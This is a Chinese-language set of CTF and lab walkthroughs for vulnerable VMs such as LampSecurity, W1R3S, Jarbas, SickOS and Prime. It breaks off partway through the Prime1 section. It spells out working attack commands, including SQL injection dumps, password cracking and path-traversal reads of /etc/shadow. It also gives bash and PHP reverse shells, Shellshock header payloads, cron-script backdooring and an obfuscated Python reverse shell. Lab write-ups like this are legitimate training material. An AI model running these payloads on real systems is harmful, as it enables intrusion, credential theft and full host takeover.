# LampSecurityCTF4

```
扫描c段存活的主机,确认靶机的ip地址。
nmap -sn 192.168.15.0/24
```

![image-20250116003115993](靶场攻击1/image-20250116003115993.png)	

```
通过扫描靶机的端口得知开放的端口。
nmap --min-rate 10000 -p- 192.168.15.55
```

![image-20250116003313769](靶场攻击1/image-20250116003313769.png)	

```
使用nmap继续查看这些端口服务的版本信息以及操作系统的相关信息。
nmap -sT -sV -O -p22,25,80,631 192.168.15.55
```

![image-20250116003443232](靶场攻击1/image-20250116003443232.png)	

```
接下来访问网站，游览完网站，发现page可能存在文件包含，但是却木有，然后感觉id可能存在sql注入，于是尝试加个',出现报错回显，则说明存在sql注入漏洞。
http://192.168.15.55/index.html?page=blog&title=Blog&id=2’
```

![image-20250116004014617](靶场攻击1/image-20250116004014617.png)	

```
使用sqlmap对三个参数都进行sql注入测试，通过--dbs列出数据库的信息,--dump导出数据库的信息,--batch默认选择选项的默认值，这样不需要用户自己去做选择。
sqlmap -u 'http://192.168.15.55/index.html?page=blog&title=Blog&id=2' --dbs --dump --batch
```

![image-20250116004135762](靶场攻击1/image-20250116004135762.png)	

```
并查看到了ehks数据库中的表中存在这些用户，以及md5碰撞出的密码。
```

![image-20250116004327915](靶场攻击1/image-20250116004327915.png)	

```
根据ssh登录dstevens用户，发现缺少匹配的key exchange，一般出现这种问题，是靶机的ssh版本和kali机器的ssh版本信息不一致，配置信息不一致所导致的。
ssh dstevens@192.168.15.55
```

![image-20250116004441390](靶场攻击1/image-20250116004441390.png)	

```shell
接下来携带key exchange信息，在进行尝试登录,却发现主机密钥类型不匹配。
ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 dstevens@192.168.15.55
```

![image-20250116004743636](靶场攻击1/image-20250116004743636.png)	

```shell
进一步携带host key type信息，进行ssh登录尝试,于是登录成功。
ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 dstevens@192.168.15.55
```

![image-20250116005102599](靶场攻击1/image-20250116005102599.png)	

```
查看当前用户能使用的sudo命令列表，结果发现都可以执行。
sudo -l
```

![image-20250116005219804](靶场攻击1/image-20250116005219804.png)	

```
那么就可以轻松提权咯
sudo /bin/bash
```

![image-20250116005326732](靶场攻击1/image-20250116005326732.png)	

# LAMPSecurityCTF5

```
首先探测C段存活主机
nmap -sn 192.168.15.0/24
```

![image-20250116105246388](靶场攻击1/image-20250116105246388.png)	

```
根据靶机的ip扫描端口。
nmap --min-rate 10000 -p- 192.168.15.56
```

![image-20250116105529981](靶场攻击1/image-20250116105529981.png)	

```
根据这些端口检测服务的版本和操作系统信息
nmap -sT -sV -O -p22,25,80,110,111,139,143,445,901,3306,47333 192.168.15.56
```

![image-20250116105652650](靶场攻击1/image-20250116105652650.png)	

```
扫描UDP端口信息，看是否有遗漏端口
nmap -sU --min-rate 10000 -p- 192.168.15.56
```

![image-20250116105906596](靶场攻击1/image-20250116105906596.png)	

```
查找这些开放端口是否存在可利用漏洞。
nmap --script=vuln -p22,25,80,110,111,139,143,445,901,3306,47333 192.168.15.56
```

![image-20250116110427432](靶场攻击1/image-20250116110427432.png)	

```
访问网页发现是nano cms系统。
```

![image-20250116110159598](靶场攻击1/image-20250116110159598.png)	

```
查看nanocms系统是否存在可利用漏洞，发现存在登录认证后的RCE远程代码执行漏洞。
searchsploit nanocms
```

![image-20250116110304605](靶场攻击1/image-20250116110304605.png)	

```
通过搜寻nano exploit发现可能存在内容泄露的情况。
```

![image-20250116110507793](靶场攻击1/image-20250116110507793.png)	

```
访问http://192.168.15.56/~andy/data/pagesdata.txt
于是访问这文件内部具有密码泄露的情况。
```

![image-20250116110651474](靶场攻击1/image-20250116110651474.png)	

```
由于密码内部是个hash值，首先可以去判断这个密码hash的类型,发现可能存在的密码类型是MD5
hash-identifier '9d2f75377ac0ab991d40c91fd27e52fd'
```

![image-20250116110832192](靶场攻击1/image-20250116110832192.png)	

```
首先将kali自带的密码本进行解压。
gunzip rockyou.txt.gz -k   
```

![image-20250116111001568](靶场攻击1/image-20250116111001568.png)	

```
使用hashcat工具把字典和md5密码进行碰撞。
hashcat -m 0 -a 0 9d2f75377ac0ab991d40c91fd27e52fd /usr/share/wordlists/rockyou.txt
```

![image-20250116111217423](靶场攻击1/image-20250116111217423.png)	

```
于是根据账户admin,密码shannon，登录cms系统。
```

![image-20250116111313486](靶场攻击1/image-20250116111313486.png)	

```
在cms系统中，根据网页进行编辑，插入php反弹shell代码。
```

![image-20250116111410695](靶场攻击1/image-20250116111410695.png)	

```
填加以下反弹shell的内容
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.15.128/1234 0>&1'"); ?>
```

![image-20250116112431425](靶场攻击1/image-20250116112431425.png)			

```
kali进行端口监听
nc -lvnp 1234
```

![image-20250116111850950](靶场攻击1/image-20250116111850950.png)	

```
于是反弹shell连接成功。
```

![image-20250116112503346](靶场攻击1/image-20250116112503346.png)	

```
接下来就是提权环节，首先查看所有该用户能访问的文件中，是否存在pass字段，其中访问不了的文件会报错，则把报错输出重定向到黑洞设备中。
于是发现有个文件内部竟然有root password的相关信息。
grep -R -i pass /home/* 2>/dev/null
```

![image-20250116112930301](靶场攻击1/image-20250116112930301.png)	

```
查看这个文件，发现root密码50$cent
cat /home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note
```

![image-20250116113042123](靶场攻击1/image-20250116113042123.png)	

```
得知密码后，切换root用户时发现需要tty标准，原因是反弹shell的交互性比较低，可以使用python提高交互性
```

![image-20250116113118210](靶场攻击1/image-20250116113118210.png)	

```
使用python提高交互性。
python -c "import pty;pty.spawn('/bin/sh');"
```

![image-20250116113229810](靶场攻击1/image-20250116113229810.png)	

```
于是再次切换root用户，提权成功。
```

![image-20250116113313220](靶场攻击1/image-20250116113313220.png)	

# W1R3S 1.0.1

```
扫描c段确定靶机的ip地址。
nmap -sn 192.168.15.0/24 
```

![image-20250117002448113](靶场攻击1/image-20250117002448113.png)	

```
以tcp三次握手的方式探测靶机的端口，并把探测出的端口输出到nmapscan目录下。
nmap -sT --min-rate 10000 -p- 192.168.15.57 -oA nmapscan/ports
```

![image-20250117002706983](靶场攻击1/image-20250117002706983.png)	

```
当主机端口开放过多，可以使用命令把输出的文件过滤出open的端口
grep open nmapscan/ports.nmap
```

![image-20250117002844005](靶场攻击1/image-20250117002844005.png)	

```
可以使用awk按照/进行分隔，并打印第一列的内容，即端口信息。
grep open nmapscan/ports.nmap|awk -F '/' '{print $1}'
```

![image-20250117003017909](靶场攻击1/image-20250117003017909.png)	

```
如果觉得显示多行不习惯，可以显示成一行。
其中-s是输出一行,-d是设置分隔符。
grep open nmapscan/ports.nmap|awk -F '/' '{print $1}'|paste -sd ','
```

![image-20250117003153349](靶场攻击1/image-20250117003153349.png)	

```
按照开放的端口进行服务版本的识别，以及操作系统信息的识别。
结果根据扫描发现ftp存在可以匿名登陆的情况，并且还列出ftp内部的三个目录。
nmap -sT -sC -sV -O -p21,22,80,3306 192.168.15.57 -oA nmapscan/detail
```

![image-20250117004504781](靶场攻击1/image-20250117004504781.png)		

```
指定UDP方式扫描最常见的20个udp端口是否打开,扫描出多个udp可疑端口，并不确定是开放还是被防火墙拦截。
nmap -sU --top-ports 20 -oA nmapscan/udp 192.168.15.57
```

![image-20250117003627193](靶场攻击1/image-20250117003627193.png)	

```
扫描这些开放端口是否有可利用漏洞，发现扫描不出什么可利用的漏洞。
nmap --script=vuln -p21,22,80,3306 192.168.15.57 -oA nmapscan/vuln
```

![image-20250117010146051](靶场攻击1/image-20250117010146051.png)		

```
根据mysql和ftp和web和ssh，一般来说ftp可以先进行渗透测试，而ssh则需要放到优先级最后。
登录ftp服务。
ftp 192.168.15.57
```

![image-20250117004739201](靶场攻击1/image-20250117004739201.png)	

```
为了保证ftp服务器中下载的文件能正常使用和运行，需要切换成binary模式，并且设置无交互模式，这样不会有提示信息。
binary
prompt
```

![image-20250117004841370](靶场攻击1/image-20250117004841370.png)	

```
将三个目录下的所有文件都下载下来
mget *.txt //下载多个文件
get 1.txt //下载单一文件。
```

![image-20250117004954238](靶场攻击1/image-20250117004954238.png)	

```
退出ftp服务器，并查看所有下载的txt文件。
发现有一个类似hash的字符串。还有一串具有base64加密特征的字符串，以及一些员工信息。
cat *.txt
```

![image-20250117005150414](靶场攻击1/image-20250117005150414.png)	

![image-20250117005233341](靶场攻击1/image-20250117005233341.png)	

```
先判断这个hash值是什么类型的,判断出大概率是md5。
hash-identifier 01ec2d8fc11c493b25029fb1f47f39ce
```

![image-20250117005401799](靶场攻击1/image-20250117005401799.png)	

```
这里尝试使用hashcat自带的密码本没有碰撞出来，在web上搜索md5 cracker碰撞出这个hash值的内容提示说不是密码。
```

![image-20250117005924372](靶场攻击1/image-20250117005924372.png)	

```
在对另一串base64的内容进行解密，发现解密的内容也是无效信息。
echo "SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg=="|base64 -d
```

![image-20250117010203902](靶场攻击1/image-20250117010203902.png)	

```
于是ftp渗透测试环节没有什么有效信息，于是可以尝试渗透mysql。
首先尝试登录mysql，却发现无法远程连接，于是放弃这条路
mysql -h 192.168.15.57 -u root -p
```

![image-20250117010408854](靶场攻击1/image-20250117010408854.png)	

```
接下来找web端的漏洞，仅发现是一个网页，并没有什么有效信息，查看源码的注释信息也没有有用信息。
```

![image-20250117010432160](靶场攻击1/image-20250117010432160.png)	

```
于是只能进行网站目录扫描。发现存在wordpress的cms系统。
gobuster dir -u http://192.168.15.57/ --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
```

![image-20250117010935943](靶场攻击1/image-20250117010935943.png)	

```
却发现wordpress无法访问，于是放弃这条路线。
```

![image-20250117011241087](靶场攻击1/image-20250117011241087.png)	

```
尝试访问另外两个目录，其中一个目录权限不够不给访问，另一个发现是一个安装界面，于是点击next
```

![image-20250117011359363](靶场攻击1/image-20250117011359363.png)	

![image-20250117011418595](靶场攻击1/image-20250117011418595.png)	

```
会发现这个是cuppa cms系统，我们随便设置号数据库名称，密码以及email尝试安装，思路是想通过管理界面注入反弹shell代码。
```

![image-20250117011626302](靶场攻击1/image-20250117011626302.png)	

```
结果发现无法安装。于是想直接这样子走到cuppa cms的管理界面是不可能了。
```

![image-20250117011746576](靶场攻击1/image-20250117011746576.png)	

```
紧接着探测这个cuppa cms有什么漏洞可以利用。
searchsploit cuppa cms
```

![image-20250117011901695](靶场攻击1/image-20250117011901695.png)	

```
下载对应的脚本文件，看看怎么利用文件包含漏洞。
searchsploit cuppa -m 25971
```

![image-20250117012026999](靶场攻击1/image-20250117012026999.png)	

```
查看文件内容，指示说明这个cms中的alertConfigField.php的一个参数存在文件包含漏洞。
```

![image-20250117012121077](靶场攻击1/image-20250117012121077.png)	

```
发现访问时没有这个文件，根据之前扫描出的administrator目录，那么很可能是这个目录作为根目录。
```

![image-20250117012323816](靶场攻击1/image-20250117012323816.png)	

```
http://192.168.15.57/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../etc/passwd
但是访问这个页面，确实进行响应了，但是没有数据显示出来。
```

![image-20250117012423797](靶场攻击1/image-20250117012423797.png)	

```
通过github找到该cms开源的源码，得知该php文件内部实际上是通过post接受这个参数的数据，所以用get的请求才出现这样的无法回显出内容的情况。
```

![image-20250117012548341](靶场攻击1/image-20250117012548341.png)	

```
利用文件包含漏洞，可以查看到所有的用户信息。
curl --data-urlencode 'urlConfig=../../../../../../../../../etc/passwd' http://192.168.15.57/administrator/alerts/alertConfigField.php
```

![image-20250117015954083](靶场攻击1/image-20250117015954083.png)	

```
于是可以使用curl --data-urlencode，表示发送的参数数据是post请求，并且经过url编码。
curl --data-urlencode 'urlConfig=../../../../../../../../../etc/shadow' http://192.168.15.57/administrator/alerts/alertConfigField.php
```

![image-20250117020059090](靶场攻击1/image-20250117020059090.png)	

```
将具有密码hash的用户全部保存到一个文件中。
```

![image-20250117020234378](靶场攻击1/image-20250117020234378.png)1

```
接下来可以使用john直接暴力破解hash,john是专门用于破解/etc/shadow的密码hash
于是得知两个账户的密码。
john shadow.hash 
```

![image-20250117020415006](靶场攻击1/image-20250117020415006.png)	

```
于是使用ssh进行远程访问其中一个账户。
ssh w1r3s@192.168.15.57
```

![image-20250117020455525](靶场攻击1/image-20250117020455525.png)	

```
查看是否sudo命令。
sudo -l
```

![image-20250117020533973](靶场攻击1/image-20250117020533973.png)	

```
那么所有都可以sudo,那么随便提权成功了
sudo /bin/bash
```

![image-20250117020609123](靶场攻击1/image-20250117020609123.png)	

```
其实这里还可以通过另外一个角度ssh密码爆破，来得知w1r3s的密码。
将需要爆破的用户名存放到一个user.txt文件中。
```

![image-20250117020831381](靶场攻击1/image-20250117020831381.png)·

```
那么只需指定密码本即可进行ssh爆破。其中-t是指定爆破密码的线程数。
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.15.57 -t 4
```

![image-20250117021244163](靶场攻击1/image-20250117021244163.png)	

# JARBAS

```
首先扫描c段，确认靶机ip
nmap -sn 192.168.15.0/24
```

![image-20250117155048239](靶场攻击1/image-20250117155048239.png)	

```
得知靶机ip后，对其进行端口的扫描
nmap --min-rate 10000 -p- 192.168.15.58
```

![image-20250117155144300](靶场攻击1/image-20250117155144300.png)	

```
检测开放端口的服务版本信息，以及操作系统的信息
nmap -sT -sV -O -p22,80,3306 192.168.15.58
```

![image-20250117155304172](靶场攻击1/image-20250117155304172.png)	

```
对靶机的UDP端口进行扫描
nmap -sU -p- 192.168.15.58  
```



```
扫描开放端口是否有可利用漏洞,发现8080存在robots.txt文件
nmap --script=vuln -p22,80,8080,3306 192.168.15.58
```

![image-20250117160012175](靶场攻击1/image-20250117160012175.png)		

```
查看这个文件的内容，发现没有什么有效信息。
```

![image-20250117160251700](靶场攻击1/image-20250117160251700.png)	

```
访问80端口的web服务，点击里面的内容，没有发现什么有效利用的漏洞，于是只能尝试暴力扫描目录。
```

![image-20250117160434453](靶场攻击1/image-20250117160434453.png)	

```
使用dirb扫描，并没有扫描出什么有效的目录。
dirb http://192.168.15.58/
```

![image-20250117160545138](靶场攻击1/image-20250117160545138.png)	

```
于是换一个大型字典进行扫描，首先下载这个字典
sudo apt install seclists
```

```
然后继续进行目录爆破扫描,但是仍然没有扫描出内容。
gobuster dir -u http://192.168.15.58/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
```

![image-20250117161645181](靶场攻击1/image-20250117161645181.png)	

```
于是根据经验很可能是有些网页没有被扫描出来，于是加上后缀html、php并继续尝试扫描,于是扫描出一个新的网页access.html
gobuster dir -u http://192.168.15.58/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x html,php
```

![image-20250117161815444](靶场攻击1/image-20250117161815444.png)	

```
访问这个网页得到一些用户和密码hash值
```

![image-20250117161853058](靶场攻击1/image-20250117161853058.png)	

```
于是网上搜索md5 cracker在线碰撞出hash的明文。
```

![image-20250117162007907](靶场攻击1/image-20250117162007907.png)	

```
由于访问8080端口是jenkins的管理系统后台，于是根据得到的密码和用户尝试登录。由于尝试三个账号和对应的密码登录失败，于是只能尝试交叉登录。使用bp抓包，然后设置集束炸弹攻击类型。
```

![image-20250117163226429](靶场攻击1/image-20250117163226429.png)	

```
设置好三个账号以及三个对应密码。
```

![image-20250117163257218](靶场攻击1/image-20250117163257218.png)	

![image-20250117163321034](靶场攻击1/image-20250117163321034.png)	

```
于是根据长度判断出正确账号应该是eder，密码是vipsu
```

![image-20250117163348323](靶场攻击1/image-20250117163348323.png)	

```
于是即可登录成功。
```

![image-20250117163430216](靶场攻击1/image-20250117163430216.png)	

```
而jenkins的利用漏洞流程很多，这里使用其中一个最为经典的，新建任务。
```

![image-20250117163519838](靶场攻击1/image-20250117163519838.png)	

```
创建自由风格项目。
```

![image-20250117163539561](靶场攻击1/image-20250117163539561.png)	

```
于是可以在项目中的构建处设置执行shell。
```

![image-20250117163613157](靶场攻击1/image-20250117163613157.png)	

```
加入反弹shell命令。
/bin/bash -i >& /dev/tcp/192.168.15.128/4444 0>&1
```

![image-20250117163829008](靶场攻击1/image-20250117163829008.png)	

```
kali机器进行监听,并且jenkins点击立即构建，那么就会触发里面的shell执行。
nc -lvnp 4444
```

![image-20250117163915484](靶场攻击1/image-20250117163915484.png)	

```
获取到低权限用户的shell
```

![image-20250117163949015](靶场攻击1/image-20250117163949015.png)	

```
想利用sudo -l提权，不知道jenkins的密码，于是无法查看能执行的sudo命令，于是放弃这个提权路线。
```

![image-20250117164439061](靶场攻击1/image-20250117164439061.png)	

```
于是只能尝试查看定时计划，发现每隔5分钟有root用户执行某个脚本文件。
cat /etc/crontab
```

![image-20250117164635223](靶场攻击1/image-20250117164635223.png)	

```
于是尝试在这个脚本内部写入反弹shell，那么以root执行当然就能提权成功咯
echo "/bin/bash -i >& /dev/tcp/192.168.15.128/4443 0>&1" >> /etc/script/CleaningScript.sh
```

![image-20250117164900794](靶场攻击1/image-20250117164900794.png)	

```
kali监听等待提权的shell即可。
nc -lvnp 4443
```

![image-20250117165136121](靶场攻击1/image-20250117165136121.png)		

# SickOS1.1

```
扫描c段，确定靶机的ip地址。
nmap -sn 192.168.15.0/24
```

![image-20250117195757376](靶场攻击1/image-20250117195757376.png)	

```
扫描靶机的端口，发现三个端口开放。
nmap -sT --min-rate 10000 -p- 192.168.15.59 
```

![image-20250117195904084](靶场攻击1/image-20250117195904084.png)	

```
检测三个开放端口的服务版本信息，以及操作系统信息
nmap -sT -sV -O -p22,3128,8080 192.168.15.59
```

![image-20250117200041696](靶场攻击1/image-20250117200041696.png)	

```
在扫描靶机的UDP端口，以确保没有遗漏端口的扫描
nmap -sU -p- 192.168.15.59
```

```
扫描开放的端口是否有可利用漏洞,然而除了扫描出dos攻击，没有别的漏洞可利用。
nmap --script=vuln -p22,3128,8080 192.168.15.59
```

![image-20250117200259296](靶场攻击1/image-20250117200259296.png)	

```
于是根据分析三个端口，ssh优先级最低，而8080端口是关闭的，那么只能围绕3128端口展开，并且这个端口使用的是squid代理服务。接下来先访问这个squid代理服务的界面，发现无有用信息，但是再次提示了squid代理服务。
```

![image-20250117200431835](靶场攻击1/image-20250117200431835.png)	

```
按照常规方法，先对这个网站进行目录爆破扫描,然而什么都没发现。
dirb http://192.168.15.59:3128/
```

![image-20250117200537628](靶场攻击1/image-20250117200537628.png)	

```
使用gobuster换成大目录字典，进行目录爆破扫描，但是也无法扫描目录成功。
gobuster dir -u http://192.168.15.59:3128/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt 
```

![image-20250117200704550](靶场攻击1/image-20250117200704550.png)	

```
根据squid代理的提示，我们可以尝试以squid作为代理去扫描站点是否有目录。
-p是指定代理
dirb http://192.168.15.59 -p http://192.168.15.59:3128/
```

![image-20250117200918113](靶场攻击1/image-20250117200918113.png)	

```
于是win10配置好代理，就可以去访问这些web站点的url路径了，于是即可访问站点成功。
```

![image-20250117201054777](靶场攻击1/image-20250117201054777.png)	

```
访问/connect，里面没有什么有效信息。
```

![image-20250117201216610](靶场攻击1/image-20250117201216610.png)	

```
访问robots文件时，提示了wolfcms系统的站点路径，于是可以围绕这个cms进行展开渗透。
```

![image-20250117201131881](靶场攻击1/image-20250117201131881.png)	

```
访问这个cms站点，游览了所有内容发现无有效信息提示。
```

![image-20250117201318199](靶场攻击1/image-20250117201318199.png)	

```
但是一般cms系统肯定具有管理后台登录站点，但是不知道路径，所以去网页搜索这个cms的管理站点路径。
于是找到站点路径是/?/admin，访问就是这个界面了。
```

![image-20250117201531682](靶场攻击1/image-20250117201531682.png)	

```
根据搜寻得知wolf cms的默认账号是admin,再根据弱口令爆破得知密码是admin，于是即可登录进去。然后对里面某个站点中添加php反弹shell代码即可。
```

![image-20250117202008741](靶场攻击1/image-20250117202008741.png)		

```
添加php的反弹shell代码,然后保存即可。
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.15.128/1234 0>&1'") ?>
```

![image-20250117202127777](靶场攻击1/image-20250117202127777.png)	

```
kali进行端口监听,并且重新点击article，那么就会触发反弹shell代码的执行。
nc -lvnp 1234
```

![image-20250117202228561](靶场攻击1/image-20250117202228561.png)	

![image-20250117202308204](靶场攻击1/image-20250117202308204.png)	

```
由于sudo -l不知道该用户密码，并且定时计划任务无可提权的任务，那么只能查看是否有敏感文件。
于是在网页根目录站点发现了config.php文件，里面包含了mysql的root密码，即john@123
cat config.php
```

![image-20250117202535805](靶场攻击1/image-20250117202535805.png)	

```
查看到系统有很多用户，于是不排除mysql的root密码可能能够登录到这些用户上，于是使用ssh依次尝试登陆
```

![image-20250117202616647](靶场攻击1/image-20250117202616647.png)	

```
于是发现这个用户可以登录。
ssh sickos@192.168.15.59
```

```
查看可以执行的sudo命令是ALL，那么接下来就随便提权了
sudo -l
```

![image-20250117202920593](靶场攻击1/image-20250117202920593.png)	

```
提权成功
sudo /bin/bash
```

![image-20250117203007215](靶场攻击1/image-20250117203007215.png)	

# SickOS1.1解法二

```
使用nikto配合squid代理扫描该靶机站点是否存在web漏洞。于是发现该站点存在shellshock漏洞。
nikto -h 192.168.15.59 -useproxy http://192.168.15.59:3128/
```

![image-20250119135927844](靶场攻击1/image-20250119135927844.png)	

```
通过该命令判断是否有shellshock漏洞，由于回显的内容有id的用户信息，说明有shellshock漏洞
-v是详细输出，--proxy是指定代理,-H是指定主机头，里面携带了命令进行远程代码执行的验证。
curl -v --proxy http://192.168.15.59:3128 http://192.168.15.59/cgi-bin/status -H "Referer:() {  test;}; echo 'Content-Type: text/plain'; echo; echo; /usr/bin/id;exit"
```

![image-20250119141942042](靶场攻击1/image-20250119141942042.png)	

```
使用msf生成一个反弹shell的bash命令。
msfvenom -p cmd/unix/reverse_bash lhost=192.168.15.128 lport=1234 -f raw
```

![image-20250119142300236](靶场攻击1/image-20250119142300236.png)	

```
于是即可把生成的反弹shell的bash命令复制进去，即可利用shellcode漏洞获得shell.
curl -v --proxy http://192.168.15.59:3128 http://192.168.15.59/cgi-bin/status -H "Referer:() {  test;};0<&77-;exec 77<>/dev/tcp/192.168.15.128/1234;sh <&77 >&77 2>&77"

如果kali监听一小会后断了，可以在msf生成payload处把sh内容补全为/bin/sh
curl -v --proxy http://192.168.15.59:3128 http://192.168.15.59/cgi-bin/status -H "Referer:() {  test;};0<&77-;exec 77<>/dev/tcp/192.168.15.128/1234;/bin/sh <&77 >&77 2>&77"
```

```
于是kali监听即可获得shell
nc -lvnp 1234
```

![image-20250119142803571](靶场攻击1/image-20250119142803571.png)	

```
接下来就是提权环节，可以先查看内核版本信息以及这个靶机安装了什么东西
uname -a 
dpkg -l
然后发现里面有安装python,于是可以使用python提高shell的交互性
python -c "import pty;pty.spawn('/bin/bash')"
```

![image-20250119143037540](靶场攻击1/image-20250119143037540.png)	

```
首先尝试查看是否能执行sudo命令,由于不知道该用户的密码，所以无法使用sudo进行提权。
sudo -l
```

```
接下来尝试查看计划任务，一定要把每个计划任务的配置文件都看一遍，看能否能进行提权的。
```

![image-20250119143621307](靶场攻击1/image-20250119143621307.png)	

```
但是这个定时计划任务明显没有能够提权的。
```

![image-20250119143652803](靶场攻击1/image-20250119143652803.png)	

```
于是查看其它的依次寻找，找到这个定时任务以root执行，并且每隔一分钟运行这个python脚本。
```

![image-20250119143740585](靶场攻击1/image-20250119143740585.png)	

```
于是使用msf生成python的反弹shell.
msfvenom -p cmd/unix/reverse_python lhost=192.168.15.128 lport=2345 -f raw
```

![image-20250119143957294](靶场攻击1/image-20250119143957294.png)	

```
将python的反弹shell代码添加进这个python文件中。
echo "exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNqNkFELgjAUhf+K7GmDmG1lGLEHCYOICtJ3ybVQsm149f/nMtNHL1y2nX33HLjl25q68cDIl2q8rhZdQ5vb2kgFMCjme3O18woDjUBsyynbhJQFlPEQjd/OT/DVOhglEL0/7Q/8e0WH7HiJ039qrybX/SlL0lscncnEgkqjtZINxi5/mHFhZIIZoI/Wcgz0WVZKG0wGcjmLYrMoPqGsGLdF5b2qMPLzUvtQIPIBYvdafA==')[0])))" >> /var/www/connect.py
```

```
kali进行监听，等待一分钟后，即可上线成功。
```

![image-20250119144343297](靶场攻击1/image-20250119144343297.png)	

# Prime1

```
扫描C段确定靶机ip地址。
nmap -sn 192.168.15.0/24
```

![image-20250119184212679](靶场攻击1/image-20250119184212679.png)	

```
扫描靶机的端口
nmap --min-rate 10000 -p- 192.168.15.60
```

![image-20250119184408198](靶场攻击1/image-20250119184408198.png)	

```
根据开放的端口检测对应的服务版本号以及操作系统信息。
nmap -sT -sV -O -p22,80 192.168.15.60
```

![image-20250119184528218](靶场攻击1/image-20250119184528218.png)	

```
扫描靶机的UDP端口是否有开放
nmap -sU -p22,80 192.168.15.60
```

![image-20250119184613410](靶场攻击1/image-20250119184613410.png)	

```
根据开放的端口扫描是否有可利用的漏洞
nmap --script=vuln -p22,80 192.168.15.60
```

![image-20250119184826626](靶场攻击1/image-20250119184826626.png)	

```
接下来根据扫描的端口的优先级，那么肯定是优先对80端口进行渗透测试，访问这个网页无任何有效信息。
```

![image-20250119184738652](靶场攻击1/image-20250119184738652.png)	

```
所以只能先对目录进行扫描,发现能够扫描出大量与wordpress相关的cms系统信息。
dirb http://192.168.15.60/
```

![image-20250119184914960](靶场攻击1/image-20250119184914960.png)	

![image-20250119184924193](靶场攻击1/image-20250119184924193.png)	

```
根据扫描的结果访问dev目录，里面提示说要深挖这个靶机的目录信息。
```

![image-20250119185115149](靶场攻击1/image-20250119185115149.png)	

```
于是在此基础上加上后缀，深挖zip和txt等文件。于是深挖出了一个secret.txt文件。
dirb http://192.168.15.60/ -X .zip,.txt
```

![image-20250119185343516](靶场攻击1/image-20250119185343516.png)	

```
访问这个txt文件，提示对每一个php文件进行fuzz操作来寻找参数信息,并且提示使用这个location.txt。
```

![image-20250119185550894](靶场攻击1/image-20250119185550894.png)	

```
根据扫描的结果，该靶机具有两个php文件。
dirb http://192.168.15.60/ -X .php  
```

![image-20250119185719494](靶场攻击1/image-20250119185719494.png)	

```
先对image.php进行fuzz操作。
wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.15.60/image.php?FUZZ=123
根据第一次fuzz的返回结果进行筛选过滤信息，结果为空。
wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hw 12 http://192.168.15.60/image.php?FUZZ=123
```

![image-20250119190020088](靶场攻击1/image-20250119190020088.png)	

```
那么就对另一个php文件进行fuzz操作，同理要做信息的过滤筛选。然后fuzz出一个参数是file.
wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hw 12 http://192.168.15.60/index.php?FUZZ=123
```

![image-20250119190701116](靶场攻击1/image-20250119190701116.png)	

```
根据这个file参数尝试文件包含漏洞，结果失败，提示挖掘的文件是错误的。
curl http://192.168.15.60/index.php?file=../../../../../../../../../etc/passwd
```

![image-20250119190845618](靶场攻击1/image-20250119190845618.png)		

```
于是根据之前的提示包含location.txt文件。发现提示了一个新的参数secrettier360来使用其他的php文件。
curl http://192.168.15.60/index.php?file=location.txt
```

![image-20250119190951071](靶场攻击1/image-20250119190951071.png)	

```
由于在image.php使用这个参数提示说找到正确的参数，于是可以尝试看看能不能进行文件包含漏洞。
curl http://192.168.15.60/image.php?secrettier360=../../../../../../etc/passwd
```

![image-20250119203416635](靶场攻击1/image-20250119203416635.png)	

```
又提示说去查看这password.txt文件，说明里面可能存在密码。
```

![image-20250119203519527](靶场攻击1/image-20250119203519527.png)	

```
结果确实存在一个密码(follow_the_ippsec)。
curl http://192.168.15.60/image.php?secrettier360=/home/saket/password.txt
```

![image-20250119203623218](靶场攻击1/image-20250119203623218.png)	

```
由于使用该密码去ssh登录主机的用户发现都不能成功,于是还是只能围绕wordpress cms展开。
首先枚举出wordpress的账号有哪些,其中-e u是用于枚举用户
wpscan --url http://192.168.15.60/wordpress/ -e u
```

![image-20250119203856128](靶场攻击1/image-20250119203856128.png)	

```
于是使用这个账号和密码可以登录到该cms的管理后台。
```

![image-20250119204024448](靶场攻击1/image-20250119204024448.png)	

```
首先登录到wordpress管理后台，接下来就由很多方法得到shell了。
第一种使用plugins来上传插件，但是上传的文件只能是zip，首先尝试上传zip结果是失败的，所以这个渗透路线放弃。
```

![image-20250119204225616](靶场攻击1/image-20250119204225616.png)	

```
第二种是在appearance中的theme editor可以试试能否更改里面的php文件，那么就可以携带php反弹shell代码。经过搜寻发现secret.php文件是可以编辑修改php代码的，于是在里面添加反弹shell代码。
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.15.128/3456 0>&1'"); ?>
```

![image-20250119204500617](靶场攻击1/image-20250119204500617.png)

```
由于不知道这个文件php在哪个路径，于是扫描目录
-e at是用于扫描wordpress下的目录信息
wpscan --url http://192.168.15.60/wordpress/ -e at
```

![image-20250119205939993](靶场攻击1/image-20250119205939993.png)	

```
于是访问该url即可触发执行反弹shell
http://192.168.15.60/wordpress/wp-content/themes/twentynineteen/secret.php
```

```
kali进行监听,当访问修改的php网页即可触发得到shell.
nc -lvnp 3456
```

![image-20250119205817957](靶场攻击1/image-20250119205817957.png)	

```
接下来就是提权，首先使用sudo -l查看，发现有个命令能够执行，但是进一步查看发现这个文件权限不够，无法修改里面的内容，于是这个提权路线无法进行下去。
```

![image-20250119210038001](靶场攻击1/image-20250119210038001.png)	

```
查看定时计划任务信息也发现无有效信息，那么只能考虑内核提权了。首先查看内核版本信息
uname -a
```

![image-20250119210308820](靶场攻击1/image-20250119210308820.png)	

```
